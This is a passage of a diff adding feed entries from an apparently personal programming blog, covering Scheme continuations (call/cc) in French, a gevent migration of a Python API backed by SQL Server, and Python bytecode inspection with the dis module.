+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;display &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;+ &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;func&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;la continuation de l'appel à func (dans &lt;code&gt;(func 10)&lt;/code&gt;) constitue une addition de la valeur retournée avec 10, puis le résultat est
+passé à la fonction &lt;code&gt;display&lt;/code&gt;.
+Le point de vue n'est plus le même que lors de la lecture du code. Quand on appelle une &lt;em&gt;continuation&lt;/em&gt;, le flot d'exécution arrive 
+brutalement. On peut voir la continuation comme ceci:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;display &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;+ &lt;/span&gt;&lt;span class="nv"&gt;x&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Mais comment obtenir une continuation pour pouvoir s'amuser avec ?&lt;/p&gt;
+&lt;p&gt;Revenons à &lt;em&gt;call/cc&lt;/em&gt; ! &lt;code&gt;call-with-current-continuation&lt;/code&gt; permet d'appeler une fonction en lui passant la continuation actuelle en paramètre.
+Si la fonction appelée appelle la &lt;em&gt;continuation&lt;/em&gt;, call-with-current-continuation retourne l'argument (peu importe) passé à la continuation.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Mais&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;On peut aussi stocker la continuation (dénommée &lt;code&gt;cont&lt;/code&gt; dans le code ci-dessous) quelque part ... et y revenir plus tard.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define &lt;/span&gt;&lt;span class="nv"&gt;v&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;func&lt;/span&gt; &lt;span class="nv"&gt;cont&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;= &lt;/span&gt;&lt;span class="nv"&gt;v&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;cont&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nv"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+
+&lt;span class="c1"&gt;;; display permet d&amp;#39;afficher du texte sur &lt;/span&gt;
+&lt;span class="c1"&gt;;; la sortie standard&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;display &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;call-with-current-continuation &lt;/span&gt;&lt;span class="nv"&gt;func&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;J'ai dis plus haut que "la valeur retournée par une fonction en lisp est la valeur de la dernière expression évalué". Et bien, pas forcément. Avec
+&lt;code&gt;call/cc&lt;/code&gt;, on peut implémenter &lt;code&gt;return&lt;/code&gt;, se comportant comme dans un langage impératif - en stopant l'exécution d'une fonction :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;call-with-return&lt;/span&gt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;call-with-current-continuation&lt;/span&gt;
+   &lt;span class="c1"&gt;;; on utilise &amp;#39;apply&amp;#39; pour appeler notre fonction (f)&lt;/span&gt;
+   &lt;span class="c1"&gt;;; avec la continuation + ses arguments originels grace&lt;/span&gt;
+   &lt;span class="c1"&gt;;; à l&amp;#39;expression (cons cont args).&lt;/span&gt;
+   &lt;span class="c1"&gt;;;&lt;/span&gt;
+   &lt;span class="c1"&gt;;; Cette fonction lambda est une &amp;#39;closure&amp;#39;: elle &lt;/span&gt;
+   &lt;span class="c1"&gt;;; capture les variables `f` et `args`&lt;/span&gt;
+   &lt;span class="c1"&gt;;; pour les réutiliser lorsqu&amp;#39;elle sera &lt;/span&gt;
+   &lt;span class="c1"&gt;;; appelée par call/cc.&lt;/span&gt;
+   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;cont&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;apply &lt;/span&gt;&lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;cons &lt;/span&gt;&lt;span class="nv"&gt;cont&lt;/span&gt; &lt;span class="nv"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)))))&lt;/span&gt;
+
+
+&lt;span class="c1"&gt;;; On récupère &amp;#39;return&amp;#39; sous forme de paramètre&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;add-or-leave&lt;/span&gt; &lt;span class="nv"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;begin&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;= &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+      &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;-1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;+ &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;display &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;call-with-return&lt;/span&gt; &lt;span class="nv"&gt;add-or-leave&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="c1"&gt;;; -&amp;gt; 10&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;display &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;call-with-return&lt;/span&gt; &lt;span class="nv"&gt;add-or-leave&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="c1"&gt;;; -&amp;gt; -1&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;display &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;call-with-return&lt;/span&gt; &lt;span class="nv"&gt;add-or-leave&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="c1"&gt;;; -&amp;gt; 20&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;La différence est quand même "assez" majeure avec &lt;em&gt;l'instruction&lt;/em&gt; &lt;strong&gt;return&lt;/strong&gt;.
+Ce &lt;code&gt;return&lt;/code&gt; ci est une fonction, qu'on peut donc être passée en paramètre à d'autres fonctions.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="images/mb.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;Concrètement, c'est assez utile dans un algorithme de backtracking ou des 
+changement de branches radicaux peuvent être prévus. Par-dessus ces concepts (&lt;code&gt;call/cc&lt;/code&gt; n'est pas tout seul !), on peut implémenter un tas de mécanismes, 
+du système d'exception au coroutines.&lt;/p&gt;
+&lt;p&gt;Pour rapprocher cela à Python, on pourrait se dire que &lt;code&gt;yield&lt;/code&gt; pourrait être une application des continuations : cette instruction permet de relâcher le &lt;a href="https://en.wikipedia.org/wiki/Control_flow"&gt;flux de controle&lt;/a&gt; et permet l'implémentation des générateurs en Python. &lt;/p&gt;
+&lt;p&gt;En &lt;em&gt;Scheme&lt;/em&gt;, &lt;code&gt;yield&lt;/code&gt; serait une macro qui capture la continuation courante, et appelle la continuation parente avec la continuation courante en argument. Ainsi, 
+l'appelant, ou qu'il soit, pourrait "réveiller" la fonction quand bon lui semble, en appelant la continuation obtenue en retour de la fonction. Pffiou.&lt;/p&gt;
+&lt;p&gt;En regardant du code, l'image m'est venu de certaines succession de callback en &lt;em&gt;Javascript&lt;/em&gt; ou 
+même des &lt;em&gt;promises&lt;/em&gt; : on s'en rapproche - mais les continuations ne sont pas matérialisées.&lt;/p&gt;
+&lt;p&gt;Je termine avec quelques exemples de concepts que l'on peut implémenter en utilisant les continuations :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;l'instruction SWITCH&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;GOTO&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Des &lt;a href="https://en.wikipedia.org/wiki/Generator_%28computer_programming%29"&gt;Générateurs&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Des &lt;a href="https://en.wikipedia.org/wiki/Green_threads"&gt;&lt;em&gt;Green Threads&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;N'hésitez pas à creuser si le sujet vous intéresse.&lt;/p&gt;</content><category term="scheme"></category><category term="lisp"></category></entry><entry><title>Python, Gevent and SQL-Server</title><link href="http://blog.devsda.fr/python-gevent.html" rel="alternate"></link><published>2017-02-24T22:20:00+01:00</published><updated>2017-02-24T22:20:00+01:00</updated><author><name>devsda</name></author><id>tag:blog.devsda.fr,2017-02-24:/python-gevent.html</id><summary type="html">&lt;p&gt;SQL Server, python then gevent: stuff goes faster&lt;/p&gt;</summary><content type="html">&lt;p&gt;Months ago, we had met requirements to migrate our main HTTP-API service to Gevent.&lt;/p&gt;
+&lt;p&gt;This service is a large, modular API system that can literally spawn APIs without downtime.
+We use it in many products including marketing micro-sites, client's tailored HTTP APIs,
+data collecting and behavior tracking.
+It uses &lt;em&gt;Flasks&lt;/em&gt; as HTTP micro-framework, and dynamically loads applications
+(as we handle 150+ different APIs, we do not directly load all of them into memory - some of them are called
+once a month).&lt;/p&gt;
+&lt;p&gt;That gives us an incredible flexibility upon material resources and a very good traffic absorption,
+at the cost of some latency, encountered when the first HTTP requests hit an unloaded API. We don't really care about this, since we need way
+more availability than low latencies. Also, this allow a decreasing latency when HTTP traffic rises, because of lazy loading. Fun to see.&lt;/p&gt;
+&lt;p&gt;This whole bunch of code is proudly handled by &lt;a href="https://uwsgi-docs.readthedocs.io/en/latest/"&gt;&lt;em&gt;uwsgi&lt;/em&gt;&lt;/a&gt;. Since uwsgi spawns a lot of processes per host,
+it can handle a lot of requests before things goes wrong.&lt;/p&gt;
+&lt;p&gt;But ... this design contained a severe mistake: what if something waits on I/O for a long time?&lt;/p&gt;
+&lt;p&gt;Like, database becoming slow after a few millions of updated rows? A remote webservice going down?&lt;/p&gt;
+&lt;p&gt;As Uwsgi spawns N processes, this number &lt;code&gt;N&lt;/code&gt; is similar to &lt;em&gt;Super Mario&lt;/em&gt;'s amount of "lives", but &lt;em&gt;Mario&lt;/em&gt; is your whole application, and any blocking IO operation (eg: http webservice, slow database lookups) could lower your amount of available processes/threads at a given time.&lt;/p&gt;
+&lt;p&gt;Depending on your OS, you could easily spot this... or not. Depending on &lt;a href="http://linuxtechsupport.blogspot.fr/2008/10/what-exactly-is-load-average.html"&gt;how your system computes load average&lt;/a&gt;
+(does processes waiting for IO completion counts ?). Nagios will alert you. Or not.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Of course, we could spawn more processes. That's not very smart, and our servers were already overloaded.
+We decided to make our app &lt;em&gt;gevent compliant&lt;/em&gt; (by avoiding potential races conditions), &lt;code&gt;import&lt;/code&gt; gevent and &lt;a href="http://www.gevent.org/gevent.monkey.html"&gt;&lt;em&gt;monkey patch&lt;/em&gt;&lt;/a&gt; all the stuff.&lt;/p&gt;
+&lt;p&gt;After resolving a few &lt;code&gt;(*^@#&amp;amp;&lt;/code&gt; pymssql/SQLServer's issues, we managed to get our app up and running on a single node of our cluster.
+And them - booom&lt;/p&gt;
+&lt;h3&gt;Booom&lt;/h3&gt;
+&lt;p&gt;Performances increased a lot... way more than we expected. We had eliminated one potential cause of unavailability,
+occuring when all the threads/processes are blocked, waiting for IO completion (or worst!).
+&lt;a href="http://www.gevent.org/"&gt;Gevent&lt;/a&gt;, allowing our processes to do "something else", while "waiting for some stuff coming from the network/disks",
+avoids blocking in such cases.&lt;/p&gt;
+&lt;p&gt;Seriously, it is so fast that &lt;strong&gt;we could have sold a server&lt;/strong&gt;, and responses times would have been better than &lt;em&gt;before the full migration&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="load_gevent" src="images/gevent_load.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;The turquoise one is our &lt;em&gt;gevented&lt;/em&gt; node. This is a screenshot taken after one host migration, during the beginning of the daily rush.
+You can clearly see that it is not even stressed, without any spikes
+(a spike indicates a metric computed in a thread that have blocked for several seconds).&lt;/p&gt;
+&lt;p&gt;Regarding the server itself, load average drop from 100-120 to &lt;strong&gt;30&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;As all the three nodes can easily absorb that traffic, latency has not increased this morning.
+Using gevent, do not forget the database - it can struggle upon thousand of light-threads querying results. Worst if you make a bad use of
+transactions (for relational only -- NoSQL will just be inconsistent)
+Also, it could reveal race conditions within your DB logic, so be careful with that.&lt;/p&gt;
+&lt;h3&gt;Database access limitation&lt;/h3&gt;
+&lt;p&gt;We have limited database access to each underlying HTTP API by using an abstraction over &lt;code&gt;gevent.queue&lt;/code&gt;.
+This &lt;em&gt;queue&lt;/em&gt;, blocking when empty, "naturally" suspends components if all of its connections are currently used.&lt;/p&gt;
+&lt;p&gt;By default, they can only fetch one database connection at one time, blocking if connection is used by another greenlet. Also, this is configurable.&lt;/p&gt;
+&lt;p&gt;Gevent could help when looking for performances, especially upon a large base of diversified code, but should be used with care :)&lt;/p&gt;</content><category term="python"></category></entry><entry><title>python, `dis` module and bytecode</title><link href="http://blog.devsda.fr/python-dis.html" rel="alternate"></link><published>2017-01-12T00:20:00+01:00</published><updated>2017-01-12T00:20:00+01:00</updated><author><name>Thomas</name></author><id>tag:blog.devsda.fr,2017-01-12:/python-dis.html</id><summary type="html">&lt;p&gt;Python's bytecode inspection with the &lt;code&gt;dis&lt;/code&gt; module&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Diving into python - bytecode&lt;/h1&gt;
+&lt;p&gt;The &lt;code&gt;dis&lt;/code&gt; module allows python's bytecode inspection (and other funny things).
+As a reminder, python's code is compiled to &lt;em&gt;bytecode&lt;/em&gt; before interpretation by &lt;a href="https://en.wikipedia.org/wiki/CPython"&gt;CPython&lt;/a&gt;.
+This bytecode is an intermediary representation and may vary between python's implementations.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python2&lt;/code&gt; store its bytecode under &lt;code&gt;.pyc&lt;/code&gt; files, and &lt;code&gt;python3&lt;/code&gt; under a directory named &lt;code&gt;__pycache__&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;When inspected via the &lt;code&gt;dis&lt;/code&gt; function, bytecode is &lt;em&gt;pretty printed&lt;/em&gt;
+on &lt;em&gt;stdout&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;According to the docs, here's the columns names:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;the line number, for the first instruction of each line&lt;/li&gt;
+&lt;li&gt;the current instruction, indicated as --&amp;gt;,&lt;/li&gt;
+&lt;li&gt;a labelled instruction, indicated with &amp;gt;&amp;gt;,&lt;/li&gt;
+&lt;li&gt;the address of the instruction,&lt;/li&gt;
+&lt;li&gt;the operation code name,&lt;/li&gt;
+&lt;li&gt;operation parameters, and&lt;/li&gt;
+&lt;li&gt;interpretation of the parameters in parentheses.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;BTW, &lt;code&gt;dis.disassemble()&lt;/code&gt; take a &lt;code&gt;&amp;lt;code object&amp;gt;&lt;/code&gt; as first parameter, so
+you'll have to compile your code before passing it.&lt;/p&gt;
+&lt;p&gt;Here's a vigorous sample:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&amp;#39;for i in range(0, 10): print(i)&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;code_obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;exec&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;disassemble&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;code_obj&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;1&lt;/span&gt;           &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;SETUP_LOOP&lt;/span&gt;              &lt;span class="mi"&gt;33&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+              &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="n"&gt;LOAD_NAME&lt;/span&gt;                &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+              &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="n"&gt;LOAD_CONST&lt;/span&gt;               &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+              &lt;span class="mi"&gt;9&lt;/span&gt; &lt;span class="n"&gt;LOAD_CONST&lt;/span&gt;               &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;12&lt;/span&gt; &lt;span class="n"&gt;CALL_FUNCTION&lt;/span&gt;            &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="n"&gt;positional&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;keyword&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;15&lt;/span&gt; &lt;span class="n"&gt;GET_ITER&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;   &lt;span class="mi"&gt;16&lt;/span&gt; &lt;span class="n"&gt;FOR_ITER&lt;/span&gt;                &lt;span class="mi"&gt;16&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="n"&gt;STORE_NAME&lt;/span&gt;               &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;22&lt;/span&gt; &lt;span class="n"&gt;LOAD_NAME&lt;/span&gt;                &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;25&lt;/span&gt; &lt;span class="n"&gt;LOAD_NAME&lt;/span&gt;                &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;28&lt;/span&gt; &lt;span class="n"&gt;CALL_FUNCTION&lt;/span&gt;            &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;positional&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;keyword&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;31&lt;/span&gt; &lt;span class="n"&gt;POP_TOP&lt;/span&gt;
+             &lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="n"&gt;JUMP_ABSOLUTE&lt;/span&gt;           &lt;span class="mi"&gt;16&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;   &lt;span class="mi"&gt;35&lt;/span&gt; &lt;span class="n"&gt;POP_BLOCK&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;   &lt;span class="mi"&gt;36&lt;/span&gt; &lt;span class="n"&gt;LOAD_CONST&lt;/span&gt;               &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="n"&gt;RETURN_VALUE&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;em&gt;it's mostly readable and clear.&lt;/em&gt;&lt;/p&gt;
+&lt;h2&gt;Example - stupid analysis about string substitution&lt;/h2&gt;
+&lt;p&gt;Stop that wrong debate about &lt;code&gt;%&lt;/code&gt; versus &lt;code&gt;.format()&lt;/code&gt; for
+string interpolation. Basically, &lt;code&gt;.format&lt;/code&gt; is more &lt;em&gt;handy&lt;/em&gt; in most
+situations.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.python.org/dev/peps/pep-3101/"&gt;PEP 3101&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Let's compare them:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;s = &amp;quot;hello &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;quot;  %a&amp;#39;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;code_obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;exec&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;disassemble&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;code_obj&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;1&lt;/span&gt;           &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;LOAD_CONST&lt;/span&gt;               &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+              &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="n"&gt;LOAD_NAME&lt;/span&gt;                &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+              &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="n"&gt;BINARY_MODULO&lt;/span&gt;
+              &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="n"&gt;STORE_NAME&lt;/span&gt;               &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="n"&gt;LOAD_CONST&lt;/span&gt;               &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;13&lt;/span&gt; &lt;span class="n"&gt;RETURN_VALUE&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;s = &amp;quot;hello {}&amp;quot;.format(a)&amp;#39;&lt;/span&gt;
